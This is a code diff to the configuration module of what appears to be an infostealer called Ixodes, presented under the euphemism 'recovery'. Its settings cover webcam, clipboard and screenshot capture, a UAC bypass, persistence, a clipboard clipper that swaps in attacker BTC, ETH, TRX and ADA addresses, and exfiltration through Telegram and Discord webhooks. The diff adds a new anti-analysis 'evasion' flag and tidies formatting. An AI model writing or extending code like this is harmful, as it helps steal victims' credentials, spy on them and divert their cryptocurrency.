@@ -1,9 +1,9 @@
+use crate::recovery::defaults::*;
 use crate::recovery::task::RecoveryCategory;
 use base64::{Engine as _, engine::general_purpose::STANDARD};
 use once_cell::sync::Lazy;
 use std::{collections::HashSet, env, str::FromStr};
 use tracing::{info, warn};
-use crate::recovery::defaults::*;
 
 static GLOBAL_RECOVERY_CONTROL: Lazy<RecoveryControl> = Lazy::new(RecoveryControl::from_env);
 
@@ -15,6 +15,7 @@ pub struct RecoveryControl {
     capture_webcams: bool,
     capture_clipboard: bool,
     uac_bypass_enabled: bool,
+    evasion_enabled: bool,
     clipper_enabled: bool,
     btc_address: Option<String>,
     eth_address: Option<String>,
@@ -26,46 +27,48 @@ pub struct RecoveryControl {
     trx_address: Option<String>,
     ada_address: Option<String>,
     telegram_token: Option<String>,
-        telegram_chat_id: Option<String>,
-        discord_webhook: Option<String>,
-            persistence_enabled: bool,
-            #[allow(dead_code)]
-            pump_size_mb: u32,
-            blocked_countries: Option<HashSet<String>>,
-            custom_extensions: Option<HashSet<String>>,
-            custom_keywords: Option<HashSet<String>>,
-        }
-        
-        impl RecoveryControl {
-            pub fn global() -> &'static Self {            &GLOBAL_RECOVERY_CONTROL
-        }
-    
-        pub fn allows_category(&self, category: RecoveryCategory) -> bool {
-            self.allowed_categories
-                .as_ref()
-                .map(|set| set.contains(&category))
-                .unwrap_or(true)
-        }
-    
-            pub fn blocked_countries(&self) -> HashSet<String> {
-                self.blocked_countries.clone().unwrap_or_default()
-            }
-        
-            pub fn custom_extensions(&self) -> HashSet<String> {
-                self.custom_extensions.clone().unwrap_or_default()
-            }
-        
-            pub fn custom_keywords(&self) -> HashSet<String> {
-                self.custom_keywords.clone().unwrap_or_default()
-            }
-        
-            #[allow(dead_code)]
-            pub fn pump_size_mb(&self) -> u32 {            self.pump_size_mb
-        }
-    
-        pub fn artifact_key(&self) -> Option<&[u8]> {
-            self.artifact_key.as_deref()
-        }
+    telegram_chat_id: Option<String>,
+    discord_webhook: Option<String>,
+    persistence_enabled: bool,
+    #[allow(dead_code)]
+    pump_size_mb: u32,
+    blocked_countries: Option<HashSet<String>>,
+    custom_extensions: Option<HashSet<String>>,
+    custom_keywords: Option<HashSet<String>>,
+}
+
+impl RecoveryControl {
+    pub fn global() -> &'static Self {
+        &GLOBAL_RECOVERY_CONTROL
+    }
+
+    pub fn allows_category(&self, category: RecoveryCategory) -> bool {
+        self.allowed_categories
+            .as_ref()
+            .map(|set| set.contains(&category))
+            .unwrap_or(true)
+    }
+
+    pub fn blocked_countries(&self) -> HashSet<String> {
+        self.blocked_countries.clone().unwrap_or_default()
+    }
+
+    pub fn custom_extensions(&self) -> HashSet<String> {
+        self.custom_extensions.clone().unwrap_or_default()
+    }
+
+    pub fn custom_keywords(&self) -> HashSet<String> {
+        self.custom_keywords.clone().unwrap_or_default()
+    }
+
+    #[allow(dead_code)]
+    pub fn pump_size_mb(&self) -> u32 {
+        self.pump_size_mb
+    }
+
+    pub fn artifact_key(&self) -> Option<&[u8]> {
+        self.artifact_key.as_deref()
+    }
     pub fn capture_screenshots(&self) -> bool {
         self.capture_screenshots
     }
@@ -84,6 +87,10 @@ pub struct RecoveryControl {
 
     pub fn uac_bypass_enabled(&self) -> bool {
         self.uac_bypass_enabled
+    }
+
+    pub fn evasion_enabled(&self) -> bool {
+        self.evasion_enabled
     }
 
     pub fn clipper_enabled(&self) -> bool {
@@ -170,13 +177,11 @@ pub struct RecoveryControl {
             parse_flag("IXODES_CAPTURE_WEBCAM").unwrap_or(DEFAULT_CAPTURE_WEBCAMS);
         let capture_clipboard =
             parse_flag("IXODES_CAPTURE_CLIPBOARD").unwrap_or(DEFAULT_CAPTURE_CLIPBOARD);
-        let persistence_enabled =
-            parse_flag("IXODES_PERSISTENCE").unwrap_or(DEFAULT_PERSISTENCE);
-        let uac_bypass_enabled =
-            parse_flag("IXODES_UAC_BYPASS").unwrap_or(DEFAULT_UAC_BYPASS);
-        let clipper_enabled =
-            parse_flag("IXODES_CLIPPER").unwrap_or(DEFAULT_CLIPPER_ENABLED);
-        
+        let persistence_enabled = parse_flag("IXODES_PERSISTENCE").unwrap_or(DEFAULT_PERSISTENCE);
+        let uac_bypass_enabled = parse_flag("IXODES_UAC_BYPASS").unwrap_or(DEFAULT_UAC_BYPASS);
+        let evasion_enabled = parse_flag("IXODES_EVASION").unwrap_or(DEFAULT_EVASION_ENABLED);
+        let clipper_enabled = parse_flag("IXODES_CLIPPER").unwrap_or(DEFAULT_CLIPPER_ENABLED);
+
         let btc_address = env::var("IXODES_BTC_ADDRESS")
             .ok()
             .or_else(|| DEFAULT_BTC_ADDRESS.map(String::from));
@@ -205,14 +210,13 @@ pub struct RecoveryControl {
             .ok()
             .or_else(|| DEFAULT_ADA_ADDRESS.map(String::from));
 
-        let pump_size_mb =
-            parse_u32("IXODES_PUMP_SIZE_MB").unwrap_or(DEFAULT_PUMP_SIZE_MB);
-        
+        let pump_size_mb = parse_u32("IXODES_PUMP_SIZE_MB").unwrap_or(DEFAULT_PUMP_SIZE_MB);
+
         let blocked_countries = env::var("IXODES_BLOCKED_COUNTRIES")
             .ok()
             .and_then(|v| parse_string_list(&v))
             .or_else(|| default_blocked_countries());
-        
+
         let custom_extensions = env::var("IXODES_CUSTOM_EXTENSIONS")
             .ok()
             .and_then(|v| parse_string_list(&v))
@@ -240,6 +244,7 @@ pub struct RecoveryControl {
             capture_webcams,
             capture_clipboard,
             uac_bypass_enabled,
+            evasion_enabled,
             clipper_enabled,
             btc_address,
             eth_address,
